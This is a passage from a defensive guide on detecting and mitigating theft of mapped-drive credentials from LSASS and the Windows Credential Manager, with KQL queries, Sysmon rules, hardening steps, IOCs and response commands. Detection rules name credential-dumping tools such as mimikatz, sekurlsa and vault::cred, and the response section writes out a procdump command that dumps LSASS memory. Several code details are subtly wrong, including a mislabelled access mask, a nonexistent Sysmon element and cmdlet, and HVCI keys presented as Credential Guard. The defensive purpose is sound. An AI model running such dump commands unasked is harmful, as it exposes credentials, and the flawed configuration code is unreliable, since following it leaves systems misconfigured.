4. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group by: `Device, User`
5. Click **Review + create**

---

#### Query 2: Credential Manager Vault Access (vault::cred Operations)

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4663), DeviceFileEvents
- **Required Fields:** ObjectName, ProcessName, AccessMask
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4663  // File System Audit
| where ObjectName matches regex @"\\AppData\\Local\\Microsoft\\Credentials\\"
| where ProcessName !in ("explorer.exe", "credwiz.exe")  // Exclude legitimate processes
| summarize count() by ObjectName, ProcessName, SubjectUserName, bin(TimeGenerated, 10m)
| where count() >= 1
| project 
    TimeGenerated,
    VaultFile = ObjectName,
    AccessingProcess = ProcessName,
    User = SubjectUserName,
    Severity = "High"
```

**What This Detects:**
- Access to Credential Manager vault files (non-standard processes)
- Potential credential dumping via dpapi::cred
- Unusual access patterns to credential storage locations

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 10 (Sysmon - Process Access to LSASS)**
- **Log Source:** Microsoft-Windows-Sysmon/Operational
- **Trigger:** Process attempts to open handle to lsass.exe with suspicious access rights
- **Filter:** `TargetImage contains "lsass.exe" AND GrantedAccess contains "0x1f0f"`
- **Applies To Versions:** Windows Vista-2025

**Event ID: 4663 (Security - File System Audit - DPAPI Vault Access)**
- **Log Source:** Security
- **Trigger:** Access to `C:\Users\*\AppData\Local\Microsoft\Credentials\*` files
- **Filter:** `ObjectName contains "Credentials" AND ObjectName contains "AppData"`
- **Applies To Versions:** Windows Vista-2025

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Object Access** → **Audit File System** (Success and Failure)
4. Enable: **Detailed Tracking** → **Audit Process Creation** (Success and Failure)
5. Run `gpupdate /force` on machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Object Access** → **Audit File System**
4. Run `auditpol /set /subcategory:"File System" /success:enable /failure:enable`

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Vista-2025

```xml
<Sysmon schemaversion="4.8">
  <RuleGroup name="Credential Theft - LSASS & Vault" groupRelation="or">
    
    <!-- Detect LSASS memory access (suspicious handle open) -->
    <ProcessAccess onmatch="include">
      <TargetImage condition="contains">lsass.exe</TargetImage>
      <GrantedAccess condition="contains">0x1f0f</GrantedAccess>  <!-- PROCESS_VM_READ -->
    </ProcessAccess>

    <!-- Detect credential extraction tools -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">mimikatz</Image>
      <Image condition="contains">procdump</Image>
      <Image condition="contains">dumpert</Image>
      <CommandLine condition="contains">sekurlsa</CommandLine>
      <CommandLine condition="contains">vault::cred</CommandLine>
    </ProcessCreate>

    <!-- Detect Credential Manager/Vault file access -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">AppData\Local\Microsoft\Credentials</TargetFilename>
    </FileCreate>

    <!-- Detect DPAPI key access -->
    <FileAccess onmatch="include">
      <TargetFilename condition="contains">Windows\System32\Microsoft\Protect</TargetFilename>
    </FileAccess>

  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon: [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create sysmon-config.xml with XML above
3. Install: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10`

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious LSASS Memory Access Detected"
- **Severity:** Critical
- **Description:** Endpoint Defender detected abnormal process attempting to access LSASS memory (credential dumping attempt)
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** 
  1. Isolate machine from network immediately
  2. Kill suspicious processes
  3. Reset all domain account passwords used on affected system
  4. Investigate data access via SMB logs

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Endpoint**: ON
4. Click **Save**
5. Go to **Security alerts** to view triggered alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable WDigest Authentication (Prevent plaintext passwords in LSASS):**
    - By default, Windows 8.1+ does NOT store plaintext passwords in LSASS. However, if WDigest is enabled, credentials appear in plaintext.
    - **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (Registry):**
    1. Open **Registry Editor** (regedit.exe)
    2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`
    3. Find or create DWORD: `UseLogonCredential`
    4. Set value to **0** (Disabled)
    5. Restart machine
    
    **Manual Steps (PowerShell):**
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0 -Force
    Restart-Computer -Force
    ```
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials Delegation**
    3. Set: **Allow Digest Authentication** to **Disabled**
    4. Run `gpupdate /force`
    
    **Validation Command:**
    ```powershell
    Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential"
    # Expected: 0 or missing (not 1)
    ```

*   **Enable LSASS Protected Process Light (PPL) - Block Mimikatz:**
    - Marks LSASS as a protected process; prevents normal user-mode access. Mimikatz requires a signed driver or kernel exploit to bypass.
    - **Applies To Versions:** Server 2012R2+ (Optional), Server 2022+ (Recommended)
    
    **Manual Steps (Registry):**
    1. Open **regedit.exe**
    2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`
    3. Create DWORD: `RunAsPPL`
    4. Set value to **1** (Enabled)
    5. Restart machine
    
    **Manual Steps (PowerShell):**
    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Force
    Restart-Computer -Force
    ```
    
    **Validation Command:**
    ```powershell
    Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
    # Expected: 1
    ```

*   **Enable Windows Defender Credential Guard (Virtualization-Based Security):**
    - Isolates LSASS credentials in a virtualized container; even kernel-level attackers cannot extract plaintext passwords.
    - **Applies To:** Windows 10/Server 2016+ (requires UEFI, Secure Boot, TPM 2.0)
    - **Prerequisite Check:**
    ```powershell
    Get-ComputerInfo | Select-Object "HyperVRequirementVirtualizationFirmwareEnabled", "HyperVRequirementSecureBoot", "HyperVRequirementUEFI"
    # All should be True
    ```
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
    3. Set: **Turn On Virtualization Based Security** to **Enabled**
    4. Set: **Require UEFI Memory Attributes Table** to **Enabled**
    5. Run `gpupdate /force`, reboot
    
    **Manual Steps (PowerShell):**
    ```powershell
    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "WakeupRequired" -Value 0
    Restart-Computer -Force
    ```
    
    **Validation Command:**
    ```powershell
    Get-ComputerInfo | Select-Object "DeviceGuardSecurityServicesConfigured"
    # Expected: Credential Guard
    ```

*   **Restrict Mapped Drive Credential Storage (Group Policy):**
    - Prevent users from saving credentials for network drives in Credential Manager.
    - **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Credentials**
    3. Set: **Restrict saving passwords and credentials** to **Enabled**
    4. Run `gpupdate /force`
    
    **Impact:** Users must re-enter network drive credentials each time (reduces convenience but improves security).

*   **Enable Security Audit Logging for LSASS Access:**
    - Log all process attempts to access LSASS; alerts if Mimikatz or similar tools execute.
    - **Applies To Versions:** Server 2016-2025
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Object Access**
    3. Enable: **Audit Kernel Object** (Success and Failure)
    4. Run `gpupdate /force`

#### Priority 2: HIGH

*   **Disable RDP Drive Redirection (Prevent file theft via RDP):**
    - Block users from redirecting local drives to RDP sessions; reduces data theft surface.
    - **Applies To Versions:** All (affects RDP user experience)
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Remote Desktop Services** → **Remote Desktop Session Host** → **Device and Resource Redirection**
    3. Set: **Do not allow drive redirection** to **Enabled**
    4. Run `gpupdate /force`
    
    **Impact:** Users cannot access local drives via RDP; file transfer must use alternative methods (SFTP, SMB).

*   **Implement Multi-Factor Authentication (MFA) for Network Access:**
    - Require MFA for SMB/RDP access; prevents lateral movement with stolen single-factor credentials.
    - **Applies To:** Entra ID hybrid environments (Server 2019+)
    
    **Manual Steps:**
    1. Configure Entra ID MFA for privileged user accounts
    2. Enable **Network Authentication with MFA** in security policies
    3. Configure **NPS (Network Policy Server)** for RADIUS-based MFA enforcement

*   **Use LAPS (Local Administrator Password Solution) for Local Accounts:**
    - Randomize local admin passwords; prevents pass-the-hash with default admin credentials.
    - **Applies To:** Server 2016+ (LAPS tool available from Microsoft)
    
    **Manual Steps:**
    1. Download LAPS: [Microsoft LAPS](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
    2. Deploy LAPS Group Policy to manage local admin passwords
    3. Configure AD to store randomly-generated passwords (rotated every 30 days)

#### Access Control & Policy Hardening

*   **Conditional Access - Block Unusual RDP Connections:**
    - **Applies To:** Entra ID integrated RDP (Server 2019+)
    
    **Manual Steps:**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block Unusual RDP Sessions`
    4. **Conditions:**
       - Applications: **RDP (Remote Desktop)**
       - Locations: **Exclude trusted IP ranges** (company office, VPN)
       - User Risk: **High**
    5. **Access controls:**
       - Grant: **Require MFA**
    6. Enable policy: **On**
    7. Click **Create**

*   **RBAC - Restrict Local Administrator Group Membership:**
    - Minimize users with local admin rights; reduces attack surface for credential theft.
    
    **Manual Steps:**
    1. Go to **Computer Management** → **Local Users and Groups** → **Groups** → **Administrators**
    2. Remove unnecessary users/groups
    3. Add only necessary IT staff (ideally service accounts with temporary elevation)
    4. Enable **PIM (Privileged Identity Management)** for time-limited admin access

#### Validation Command (Verify All Mitigations Active)

```powershell
# Check WDigest disabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue
# Result: 0 or missing (GOOD)

# Check LSASS PPL enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
# Result: 1 (GOOD)

# Check Credential Guard enabled
Get-ComputerInfo | Select-Object "DeviceGuardSecurityServicesConfigured"
# Result: Credential Guard (GOOD)

# Check RDP drive redirection disabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "fDisableDriveRedirection" -ErrorAction SilentlyContinue
# Result: 1 (GOOD)
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Temp\mimikatz.exe`, `C:\Temp\Mimikatz.zip` (tool download/staging)
    - `C:\Temp\lsass.dmp`, `C:\Temp\lsass.zip` (LSASS memory dump)
    - `C:\Windows\Temp\*.dmp` (memory dumps in standard temp directory)
    - `C:\Users\*\AppData\Local\Microsoft\Credentials\*` (vault files accessed with unusual timestamps)

*   **Registry:**
    - `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest:UseLogonCredential = 1` (WDigest enabled maliciously)
    - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa:RunAsPPL = 0` (LSASS PPL disabled to allow Mimikatz)
    - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\*` (persistence via startup registry)

*   **Network:**
    - SMB connections from unexpected endpoints to file servers (lateral movement with stolen SMB credentials)
    - RDP connections from unusual locations or times (credential reuse for RDP access)
    - Large data exfiltration via tsclient UNC path (\\tsclient\c$ accessed from RDP session)

#### Forensic Artifacts

*   **Disk:**
    - Windows Event Log Security.evtx: Event ID 4688 (Mimikatz.exe execution), 4663 (vault file access), 5140 (SMB share access)
    - Sysmon log: Event ID 10 (LSASS handle open), 3 (RDP tsclient connections)
    - NTFS $MFT (Master File Table): Check for recently-deleted lsass.dmp, mimikatz.exe files (recoverable)
    - Pagefile.sys, hiberfil.sys: May contain LSASS memory contents if machine hibernated during dump

*   **Memory:**
    - lsass.exe: Contains plaintext credentials, Kerberos tickets (evidence of recent authentications)
    - svchost.exe (hosting RDP services): May contain RDP session credentials
    - Mimikatz.exe: If running in memory, contains credential extraction module code

*   **Cloud (Entra/M365):**
    - Entra ID Signin logs: Check for logon success from unusual IPs (credential reuse after theft)
    - Conditional Access logs: Block events for stolen credential attempts
    - M365 audit logs: Unusual SMB access patterns (elevated access to sensitive shares)

#### Response Procedures

1.  **Isolate:**
    - Disconnect affected machine from network (physically unplug or disable NIC)
    - **Command:**
    ```powershell
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```
    - **Manual (Azure VM):**
      - Go to **Azure Portal** → **Virtual Machines** → Select VM → **Networking** → Select NIC → **Disable**

2.  **Collect Evidence:**
    - Dump memory immediately (before potential cleanup):
    ```powershell
    # Export memory for forensics
    procdump64.exe -ma lsass.exe C:\Evidence\lsass.dmp
    
    # Export Security Event Log
    wevtutil epl Security C:\Evidence\Security.evtx
    
    # Export Sysmon log
    wevtutil epl Microsoft-Windows-Sysmon/Operational C:\Evidence\Sysmon.evtx
    ```
    - Copy vault credentials directory: `Copy-Item "C:\Users\*\AppData\Local\Microsoft\Credentials" -Destination "C:\Evidence\" -Recurse`
    - Hash all executable files (detect Mimikatz): `Get-FileHash -Path "C:\Temp\*" -Algorithm SHA256`

3.  **Remediate:**
    - **Terminate malicious processes:**
    ```powershell
    Stop-Process -Name "mimikatz" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "procdump" -Force -ErrorAction SilentlyContinue
    ```
    
    - **Revoke stolen credentials:**
    ```powershell
    # Reset password for all potentially compromised domain accounts
    # Example: fileserver-admin account whose credentials were stolen
    Set-ADUserPassword -Identity "fileserver-admin" -NewPassword (ConvertTo-SecureString -AsPlainText "NewComplexPass!2025" -Force) -Reset
    
    # Force logout from all network sessions
    logoff 0 /server:fileserver
    ```
    
    - **Remove from compromised systems:**
    ```powershell
    # Remove malicious files
    Remove-Item -Path "C:\Temp\mimikatz.exe" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "C:\Temp\lsass.dmp" -Force -ErrorAction SilentlyContinue
    
    # Reset affected endpoint
    # (Most reliable: reimage from known-good backup or VM snapshot)
    ```

4.  **Investigate Lateral Movement:**
    - Query SMB logs on file servers for access by stolen accounts from unexpected source IPs
    - Check RDP logs for logons with stolen credentials
    - Review command execution logs (PowerShell, WMI) for post-compromise activity
    - Escalate to incident response if data exfiltration suspected

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Remote Code Execution | Attacker gains initial foothold (phishing RDP, vulnerable service) |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare / Local Privilege Escalation | Attacker escalates to local admin |
| **3** | **Credential Access** | **[CA-DUMP-009]** | **Attacker extracts mapped drive credentials from LSASS/Vault** |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash (PTH) | Attacker uses extracted NTLM hashes to access file servers/domain resources |
| **5** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker maintains admin access for continued exploitation |
| **6** | **Credential Access (T0)** | [CA-DUMP-006] NTDS.dit Extraction | Attacker gains domain controller access and extracts all domain password hashes |
| **7** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker encrypts all networked systems using T0 admin rights |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider - Mapped Drive Credential Harvesting (2023)

- **Target:** Large US retailer (500+ PCs with mapped drives)
- **Timeline:** Initial access (phishing) → Local admin escalation (PrintNightmare) → Mimikatz credential extraction → File server compromise → T0 access via credential reuse → Ransomware deployment (all 500+ systems encrypted)
- **Technique Status:** Attackers extracted "fileserver-admin" credentials from mapped drive LSASS memory (WDigest enabled on file server); used pass-the-hash to pivot to domain controller
- **Impact:** $20M+ ransomware attack; 3-week recovery; customer data exposed
- **Reference:** [Scattered Spider Group Profile - CrowdStrike](https://www.crowdstrike.com/blog/scattered-spider-intrusion-campaign-analysis/)

#### Example 2: RDStealer Malware - RDP Device Redirection Exploitation (2023)

- **Target:** Multiple remote-working enterprises
- **Timeline:** Attacker compromises RDP jump host → Installs RDStealer malware → Monitors for RDP connections → Steals credentials from client's redirected C: drives (KeePass databases, SSH keys, RDP cache) → Escalates to T0
- **Technique Status:** Custom malware exploits tsclient UNC path to access client machines' local drives without user knowledge
- **Impact:** Lateral movement to T1/T0 admin systems via stolen SSH keys and RDP credentials
- **Reference:** [RDStealer Malware Analysis - Bleeping Computer](https://www.bleepingcomputer.com/news/security/new-rdstealer-malware-steals-from-drives-shared-over-remote-desktop/)

#### Example 3: Conti Ransomware - Mapped Drive Lateral Movement (2021)

- **Target:** Mid-size healthcare organization
- **Timeline:** Initial RDP compromise → Local admin elevation → Mimikatz extraction of backup-admin credentials from mapped drive → Lateral movement to backup server → T0 access via credential reuse
- **Technique Status:** Attackers targeted mapped network drives (backup share, file server) to harvest high-privilege service account credentials
- **Impact:** Backup systems encrypted; production data unavailable; $2M ransom demand
- **Reference:** [Conti Ransomware Infrastructure - Mandiant](https://www.mandiant.com/resources/reports/conti-ransomware-infrastructure)

---
